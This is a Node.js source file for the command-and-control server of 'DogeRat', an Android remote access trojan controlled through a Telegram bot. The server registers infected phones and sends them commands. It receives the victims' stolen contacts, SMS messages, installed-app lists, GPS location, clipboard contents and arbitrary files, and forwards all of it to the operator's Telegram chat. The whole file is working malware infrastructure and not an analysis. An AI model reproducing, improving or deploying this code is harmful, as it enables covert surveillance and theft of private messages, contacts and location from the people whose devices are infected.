const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// ========== قراءة الإعدادات من ملف data.json ==========
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
    console.error('❌ Failed to read data.json:', error);
    process.exit(1);
}

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

// ========== إعدادات البوت ==========
const bot = new telegramBot(data.token, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// معالجة أخطاء البولينغ
bot.on('polling_error', (error) => {
    console.log('⚠️ Polling error:', error.code);
    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
        console.log('🔄 Reconnecting bot...');
        setTimeout(() => {
            try {
                bot.startPolling();
            } catch (e) {
                console.log('❌ Reconnection failed:', e.message);
            }
        }, 5000);
    }
});

// ========== تخزين البيانات ==========
const connectedDevices = new Map();

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// ========== أوامر البوت ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(data.id, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['📱 Devices', '📳 Vibrate'],
                ['🔔 Test Notification', '❌ Cancel']
            ],
            resize_keyboard: true
        }
    });
});

// ========== عرض الأجهزة ==========
bot.onText(/📱 Devices/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected', {
            reply_markup: {
                keyboard: [
                    ['📱 Devices', '📳 Vibrate'],
                    ['🔔 Test Notification', '❌ Cancel']
                ],
                resize_keyboard: true
            }
        });
        return;
    }

    let message = `📱 <b>Connected devices: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    for (const [id, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `📱 <b>Device:</b> ${device.name}\n`;
        message += `📟 <b>Model:</b> ${device.model}\n`;
        message += `🌐 <b>IP:</b> ${device.ip}\n`;
        message += `🕐 <b>Time:</b> ${device.time}\n\n`;
        index++;
    }

    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML'
    });
});

// ========== أمر الاهتزاز ==========
bot.onText(/📳 Vibrate/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }

    const [deviceId] = connectedDevices.keys();
    const device = connectedDevices.get(deviceId);
    
    console.log(`📳 Sending vibrate to: ${deviceId}`);
    io.to(deviceId).emit('command', { request: 'vibrate' });
    
    bot.sendMessage(data.id, `📳 Vibrate command sent to ${device.name}!`);
});

// ========== أمر اختبار الإشعارات ==========
bot.onText(/🔔 Test Notification/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }

    const [deviceId] = connectedDevices.keys();
    const device = connectedDevices.get(deviceId);
    
    console.log(`🔔 Sending test notification to: ${deviceId}`);
    io.to(deviceId).emit('command', { request: 'notification', text: 'Hello from DogeRat Server!' });
    
    bot.sendMessage(data.id, `🔔 Test notification sent to ${device.name}!`);
});

// ========== أمر إلغاء ==========
bot.onText(/❌ Cancel/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, '✅ Action cancelled', {
        reply_markup: {
            keyboard: [
                ['📱 Devices', '📳 Vibrate'],
                ['🔔 Test Notification', '❌ Cancel']
            ],
            resize_keyboard: true
        }
    });
});

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);
    
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';
    const deviceId = socket.id;

    const deviceInfo = {
        id: deviceId,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    
    connectedDevices.set(deviceId, deviceInfo);
    console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
    
    bot.sendMessage(data.id, `
✅ <b>New device connected</b>

📱 <b>Device:</b> ${deviceName}
📟 <b>Model:</b> ${deviceModel}
🌐 <b>IP:</b> ${deviceIp}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
    `, { parse_mode: 'HTML' });

    // ========== استقبال الأوامر من الجهاز ==========
    socket.on('command', (commandData) => {
        const { request } = commandData;
        const device = connectedDevices.get(socket.id);
        console.log(`📩 Command from device: ${request} from ${device?.name}`);
        bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
    });

    // ========== استقبال البيانات من الجهاز ==========
    socket.on('data', (socketData) => {
        const { type, content } = socketData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        console.log(`📊 Data received: ${type} from ${deviceName}`);

        switch (type) {
            case 'contacts':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📋 Contacts from: ${deviceName}`,
                    filename: `contacts_${deviceName}.json`
                });
                break;

            case 'sms':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `💬 SMS messages from: ${deviceName}`,
                    filename: `sms_${deviceName}.json`
                });
                break;

            case 'apps':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📱 Apps from: ${deviceName}`,
                    filename: `apps_${deviceName}.json`
                });
                break;

            case 'location':
                bot.sendMessage(data.id, `
📍 <b>Location received from ${deviceName}</b>

🌐 Latitude: ${content.lat}
🌐 Longitude: ${content.lng}
🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
                `, { parse_mode: 'HTML' });
                break;

            case 'clipboard':
                bot.sendMessage(data.id, `
📋 <b>Clipboard from ${deviceName}</b>

${content}
                `, { parse_mode: 'HTML' });
                break;

            default:
                console.log('📦 Unknown data type:', type);
                bot.sendMessage(data.id, `📦 Unknown data type: ${type} from ${deviceName}`);
        }
    });

    // ========== استقبال الملفات ==========
    socket.on('file', (fileData) => {
        const { filename, content } = fileData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        bot.sendDocument(data.id, Buffer.from(content), {
            caption: `📁 File from: ${deviceName}`,
            filename: filename
        });
    });

    // ========== انقطاع الاتصال ==========
    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            console.log(`❌ Device disconnected: ${device.name}`);
            bot.sendMessage(data.id, `
❌ <b>Device disconnected</b>

📱 <b>Device:</b> ${device.name}
📟 <b>Model:</b> ${device.model}
🕐 <b>Time:</b> ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
    console.log(`✅ Using data.json with token: ${data.token.substring(0, 15)}...`);
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});
